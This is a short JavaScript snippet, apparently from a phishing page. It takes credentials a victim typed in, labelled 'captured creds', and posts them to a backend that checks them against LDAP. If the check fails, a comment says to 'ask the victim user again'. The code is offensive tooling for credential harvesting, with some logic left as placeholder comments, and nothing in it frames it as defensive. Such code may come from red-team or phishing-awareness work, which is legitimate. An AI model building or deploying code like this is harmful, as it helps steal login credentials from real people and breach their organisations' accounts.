var data =
{
    "ldap_verify": input.value // captured creds
};
var dataToSend = JSON.stringify(data);
// post the data
$.ajax(
    {
        url: '/backend/',
        type: 'POST',
        data: dataToSend,

        success: function (jsonResponse) {
            var objresponse = JSON.parse(jsonResponse);
            var verify_status = objresponse['ldap_verify']
            if (verify_status == 'success') {
               // Print Success Message
            } else if (verify_status == 'fail') {
               // Credentials are invalid. Ask the victim user again.
            }
       }
    }
 );
